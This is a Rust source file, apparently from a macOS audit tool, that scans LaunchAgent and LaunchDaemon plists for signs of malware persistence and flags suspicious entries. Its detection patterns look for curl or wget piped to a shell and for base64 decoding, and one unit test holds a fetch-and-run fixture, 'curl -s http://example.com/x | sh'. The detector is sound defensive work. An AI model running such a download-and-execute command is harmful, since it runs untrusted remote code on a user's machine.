//! Persistence check: do any of the LaunchAgent and LaunchDaemon items that
//! run at startup look suspicious?
//!
//! Malware frequently drops a `.plist` into these directories so that it can
//! keep running after a restart. The scan here relies on simple heuristic
//! rules; it is not a definitive verdict but a "take a look" warning.

use super::{Check, Outcome, Severity};
use crate::runner::CommandRunner;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub struct LaunchItems;

/// It is unusual for a program to run from these locations.
const TEMP_DIRS: [&str; 5] = [
    "/tmp/",
    "/private/tmp/",
    "/var/tmp/",
    "/private/var/tmp/",
    "/Users/Shared/",
];

impl Check for LaunchItems {
    fn id(&self) -> &'static str {
        "launch-items"
    }
    fn name(&self) -> &'static str {
        "Launch items"
    }
    fn weight(&self) -> u32 {
        10
    }
    fn severity(&self) -> Severity {
        Severity::Medium
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let plists = find_plists(&launch_dirs());
        let mut suspicious: Vec<String> = Vec::new();
        let mut unreadable = 0;

        for path in &plists {
            // `plutil` converts the plist to JSON; it does not modify the
            // file (`-o -` writes the result to stdout).
            let json = runner
                .run("plutil", &["-convert", "json", "-o", "-", &path.to_string_lossy()])
                .ok()
                .filter(|out| out.success)
                .and_then(|out| serde_json::from_str::<Value>(&out.stdout).ok());

            match json {
                Some(plist) => {
                    if let Some(reason) = suspicion(&plist) {
                        let file = path.file_name().unwrap_or_default().to_string_lossy();
                        suspicious.push(format!("{file} ({reason})"));
                    }
                }
                None => unreadable += 1,
            }
        }

        if !suspicious.is_empty() {
            return Outcome::warn(
                format!("Suspicious items: {}.", suspicious.join(", ")),
                "Review the items you don't recognize; if unneeded, remove the corresponding .plist file.",
            );
        }

        let mut detail = format!("{} items examined, none suspicious", plists.len());
        if unreadable > 0 {
            detail.push_str(&format!(" ({unreadable} could not be read)"));
        }
        detail.push('.');
        Outcome::pass(detail)
    }
}

/// The directories to scan: the system-wide ones and those of the current user.
fn launch_dirs() -> Vec<PathBuf> {
    let mut dirs = vec![
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    if let Some(home) = std::env::var_os("HOME") {
        dirs.push(Path::new(&home).join("Library/LaunchAgents"));
    }
    dirs
}

/// Collects the `.plist` files in the directories in sorted order. Directories
/// that cannot be read or do not exist are silently skipped.
fn find_plists(dirs: &[PathBuf]) -> Vec<PathBuf> {
    let mut plists: Vec<PathBuf> = dirs
        .iter()
        .filter_map(|dir| std::fs::read_dir(dir).ok())
        .flatten() // directory entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().is_some_and(|ext| ext == "plist"))
        .collect();
    plists.sort();
    plists
}

/// Returns the reason if a launch item looks suspicious.
fn suspicion(plist: &Value) -> Option<&'static str> {
    // The command being run: the `Program` key and/or the `ProgramArguments` array.
    let mut command: Vec<&str> = Vec::new();
    if let Some(program) = plist.get("Program").and_then(Value::as_str) {
        command.push(program);
    }
    if let Some(args) = plist.get("ProgramArguments").and_then(Value::as_array) {
        command.extend(args.iter().filter_map(Value::as_str));
    }

    let program = *command.first()?;
    let joined = command.join(" ");

    if TEMP_DIRS.iter().any(|dir| program.starts_with(dir)) {
        return Some("runs from a temporary/shared directory");
    }
    // A path component that starts with a dot, such as "/Users/x/.hidden/tool".
    if program.split('/').any(|part| part.starts_with('.') && part.len() > 1) {
        return Some("runs from a hidden directory");
    }
    let downloads = joined.contains("curl ") || joined.contains("wget ");
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
        .iter()
        .any(|pattern| joined.contains(pattern));
    if downloads && pipes_to_shell {
        return Some("directly runs a script it downloads");
    }
    if joined.contains("base64") && (joined.contains(" -d") || joined.contains("--decode")) {
        return Some("runs a command obfuscated with base64");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn ordinary_app_is_not_suspicious() {
        let plist = json!({
            "Label": "com.cloudflare.warp",
            "ProgramArguments": ["/Applications/Cloudflare WARP.app/Contents/Resources/CloudflareWARP"],
        });
        assert_eq!(suspicion(&plist), None);
    }

    #[test]
    fn running_from_temp_dir_is_suspicious() {
        let plist = json!({ "Program": "/tmp/updater" });
        assert_eq!(
            suspicion(&plist),
            Some("runs from a temporary/shared directory")
        );

        let shared = json!({ "ProgramArguments": ["/Users/Shared/helper", "--daemon"] });
        assert!(suspicion(&shared).is_some());
    }

    #[test]
    fn hidden_dir_is_suspicious() {
        let plist = json!({ "ProgramArguments": ["/Users/alice/.cache/agent"] });
        assert_eq!(suspicion(&plist), Some("runs from a hidden directory"));
    }

    #[test]
    fn download_and_run_is_suspicious() {
        let plist = json!({
            "ProgramArguments": ["/bin/sh", "-c", "curl -s http://example.com/x | sh"],
        });
        assert_eq!(
            suspicion(&plist),
            Some("directly runs a script it downloads")
        );
    }

    #[test]
    fn plist_without_command_is_skipped() {
        assert_eq!(suspicion(&json!({ "Label": "empty" })), None);
    }

    #[test]
    fn only_plist_files_are_collected() {
        let dir = std::env::temp_dir().join(format!("macos-audit-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("b.plist"), "").unwrap();
        std::fs::write(dir.join("a.plist"), "").unwrap();
        std::fs::write(dir.join("not.txt"), "").unwrap();

        let found = find_plists(&[dir.clone(), dir.join("missing")]);
        std::fs::remove_dir_all(&dir).unwrap();

        let names: Vec<_> = found
            .iter()
            .map(|path| path.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, ["a.plist", "b.plist"]);
    }
}
